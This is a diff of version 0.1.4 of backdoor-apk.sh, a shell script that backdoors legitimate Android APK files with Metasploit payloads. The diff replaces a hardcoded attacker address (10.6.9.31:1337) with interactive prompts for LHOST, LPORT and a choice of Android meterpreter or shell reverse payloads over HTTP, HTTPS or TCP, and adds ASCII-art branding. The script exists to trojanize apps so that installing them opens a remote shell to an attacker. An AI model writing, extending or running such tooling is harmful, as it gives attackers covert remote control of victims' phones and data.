@@ -2,7 +2,7 @@
 
 # file: backdoor-apk.sh
 
-# version: 0.1.3
+# version: 0.1.4
 
 # usage: ./backdoor-apk.sh original.apk
 
@@ -10,21 +10,19 @@
 # Security Engineer
 # Check Point Software Technologies, Ltd.
 
-# modify the following values as necessary
+# IMPORTANT: The following packages were required on Kali Linux in order to get things rolling. These packages are likely required by other Linux distros as well.
+# apt-get install lib32z1 lib32ncurses5 lib32stdc++6
+
+PAYLOAD=""
+LHOST=""
+LPORT=""
+
 MSFVENOM=msfvenom
-LHOST="10.6.9.31"
-LPORT="1337"
-#PAYLOAD="android/meterpreter/reverse_http"
-#PAYLOAD="android/meterpreter/reverse_https"
-PAYLOAD="android/meterpreter/reverse_tcp"
-#PAYLOAD="android/shell/reverse_http"
-#PAYLOAD="android/shell/reverse_https"
-#PAYLOAD="android/shell/reverse_tcp"
 DEX2JAR=d2j-dex2jar
 UNZIP=unzip
 KEYTOOL=keytool
 JARSIGNER=jarsigner
-APKTOOL=third-party/apktool/apktool
+APKTOOL=apktool
 PROGUARD=third-party/proguard5.2.1/lib/proguard
 DX=third-party/android-sdk-linux/build-tools/23.0.3/dx
 ZIPALIGN=third-party/android-sdk-linux/build-tools/23.0.3/zipalign
@@ -69,8 +67,89 @@ function consult_which {
   fi
 }
 
+function print_ascii_art {
+cat << "EOF"
+          ________
+         / ______ \
+         || _  _ ||
+         ||| || |||          AAAAAA      PPPPPPP    KKK  KKK
+         |||_||_|||         AAA  AAA     PPP  PPP   KKK KKK
+         || _  _o|| (o)    AAAA  AAAA    PPP  PPPP  KKKKKK
+         ||| || |||       AAAAAAAAAAAA   PPPPPPPP   KKK KKK
+         |||_||_|||      AAAA      AAAA  PPPP       KKK  KKK
+         ||______||     AAAA        AAAA PPPP       KKK  KKKK
+        /__________\
+________|__________|__________________________________________
+       /____________\
+       |____________|             Dana James Traversie
+
+EOF
+}
+
+function get_payload {
+  echo "[+] Android payload options:"
+  PS3='[?] Please select an Android payload option: '
+  options=("meterpreter/reverse_http" "meterpreter/reverse_https" "meterpreter/reverse_tcp" "shell/reverse_http" "shell/reverse_https" "shell/reverse_tcp")
+  select opt in "${options[@]}"
+  do
+    case $opt in
+      "meterpreter/reverse_http")
+        PAYLOAD="android/meterpreter/reverse_http"
+        break
+        ;;
+      "meterpreter/reverse_https")
+        PAYLOAD="android/meterpreter/reverse_https"
+        break
+        ;;
+      "meterpreter/reverse_tcp")
+        PAYLOAD="android/meterpreter/reverse_tcp"
+        break
+        ;;
+      "shell/reverse_http")
+        PAYLOAD="android/shell/reverse_http"
+        break
+        ;;
+      "shell/reverse_https")
+        PAYLOAD="android/shell/reverse_https"
+        break
+        ;;
+      "shell/reverse_tcp")
+        PAYLOAD="android/shell/reverse_tcp"
+        break
+        ;;
+      *)
+        echo "[!] Invalid option selected"
+        ;;
+    esac
+  done
+}
+
+function get_lhost {
+  while true; do
+    read -p "[?] Please enter an LHOST value: " lh
+    if [ $lh ]; then
+      LHOST=$lh
+      break
+    fi
+  done
+}
+
+function get_lport {
+  while true; do
+    read -p "[?] Please enter an LPORT value: " lp
+    if [ $lp ]; then
+      if [[ "$lp" =~ ^[0-9]+$ ]] && [ "$lp" -ge 1 -a "$lp" -le 65535 ]; then
+        LPORT=$lp
+        break
+      fi
+    fi
+  done
+}
+
 function init {
   echo "Running backdoor-apk at $TIME_OF_RUN" >$LOG_FILE 2>&1
+  print_ascii_art
+  echo "[*] Running backdoor-apk.sh v0.1.4 on $TIME_OF_RUN"
   consult_which $MSFVENOM
   consult_which $DEX2JAR
   consult_which $UNZIP
@@ -81,6 +160,9 @@ function init {
   consult_which $DX
   consult_which $ZIPALIGN
   verify_orig_apk
+  get_payload
+  get_lhost
+  get_lport
 }
 
 # kick things off
